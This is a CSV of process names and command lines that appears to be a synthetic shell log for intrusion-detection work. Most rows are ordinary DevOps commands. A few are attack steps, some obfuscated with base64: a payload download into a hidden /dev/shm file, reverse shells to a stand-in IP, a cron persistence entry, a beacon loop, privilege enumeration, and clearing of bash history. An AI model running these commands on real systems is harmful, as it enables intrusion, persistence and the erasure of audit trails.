process_name,command_line
pip3,pip3 install -r requirements.txt
kubectl,kubectl logs deploy/nginx --tail 50
bash,"X='curl -fsSL http://198.51.100.198/sh -o /dev/shm/.font-unix/.systemd-private'; eval ""$X"""
python3,python3 -m pytest tests/ -q
grep,grep -r 'TODO' /home/ec2-user/platform/src
ps,ps aux --sort=-%mem | head
free,free -m
kubectl,kubectl rollout status deploy/postgres
systemctl,systemctl restart nginx
npm,npm run build
git,git log --oneline -n 10
bash,echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjE5OC84NDQzIDA+JjE= | base64 -d | bash
docker,docker logs --tail 100 search
docker,docker build -t nginx:89 .
docker,docker ps -a
uptime,uptime
redis-cli,redis-cli ping
terraform,terraform plan -out tfplan
journalctl,journalctl -u auth-svc --since '10 min ago'
grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src
node,node scripts/seed.js
npm,npm test -- --runInBand
git,git pull origin main
apt-get,apt-get install -y nodejs
htop,htop -d 5
bash,echo KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gJ0ByZWJvb3QgYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjE5OC84NDQzIDA+JjEnKSB8IGNyb250YWIgLQ== | base64 -d | bash
journalctl,journalctl -u redis --since '10 min ago'
git,git commit -am 'fix: search retry logic'
aws,aws s3 ls s3://search-artifacts/
go,go build ./...
df,df -h
systemctl,systemctl status auth-svc
find,find /home/ec2-user/infra -name '*.log' -mtime +7
make,make lint
bash,ls -la /home/ec2-user
journalctl,journalctl -u api-gateway --since '10 min ago'
bash,echo bXYgL2Rldi9zaG0vLmZvbnQtdW5peC8uc3lzdGVtZC1wcml2YXRlIC91c3Ivc2Jpbi8uLnN5c3RlbWQtcHJpdmF0ZQ== | base64 -d | bash
scp,scp report.csv ec2-user@reports:/srv/reports/
find,find /home/ec2-user/web-app -name '*.log' -mtime +7
git,git checkout main
git,git checkout develop
tar,tar czf /backups/auth-svc-66.tgz /var/lib/auth-svc
docker,docker logs --tail 100 worker
kubectl,kubectl logs deploy/api-gateway --tail 50
apt-get,apt-get install -y openjdk-17-jdk
kubectl,kubectl get pods -n production
systemctl,systemctl restart api-gateway
bash,echo d2hpbGUgdHJ1ZTsgZG8gY3VybCAtcyBodHRwOi8vY2RuLWFzc2V0cy02MzkudGVzdC9iOyBzbGVlcCA2MDsgZG9uZSAm | base64 -d | bash
bash,cd /home/ec2-user/infra && ls
kubectl,kubectl logs deploy/redis --tail 50
npm,npm ci --no-audit
psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;'
curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head
kubectl,kubectl logs deploy/search --tail 50
apt-get,apt-get install -y jq
rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/worker/
journalctl,journalctl -u nginx --since '10 min ago'
bash,cd /home/ec2-user/billing-service && ls
curl,curl -s http://localhost:8080/health
journalctl,journalctl -u postgres --since '10 min ago'
aws,aws s3 ls s3://redis-artifacts/
bash,echo c3VkbyAtbiAtbCAyPi9kZXYvbnVsbA== | base64 -d | bash
tar,tar czf /backups/api-gateway-17.tgz /var/lib/api-gateway
systemctl,systemctl restart postgres
docker,docker logs --tail 100 redis
systemctl,systemctl restart redis
git,git checkout release/2.4
bash,"X='ss -tnp 2>/dev/null | head -n 40'; eval ""$X"""
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head
kubectl,kubectl rollout status deploy/payments
ssh,ssh ec2-user@build-56 uptime
docker,docker logs --tail 100 payments
bash,cd /home/ec2-user/platform && ls
docker,docker compose up -d api-gateway
aws,aws s3 ls s3://worker-artifacts/
docker,docker build -t api-gateway:57 .
git,git pull origin hotfix/login
python3,python3 /opt/app/manage.py migrate
git,git pull origin release/2.4
systemctl,systemctl status postgres
find,find /home/ec2-user/data-pipeline -name '*.log' -mtime +7
tar,tar czf /backups/api-gateway-56.tgz /var/lib/api-gateway
bash,"X='truncate -s0 /home/ec2-user/.bash_history 2>/dev/null'; eval ""$X"""
docker,docker logs --tail 100 nginx
tar,tar czf /backups/api-gateway-33.tgz /var/lib/api-gateway
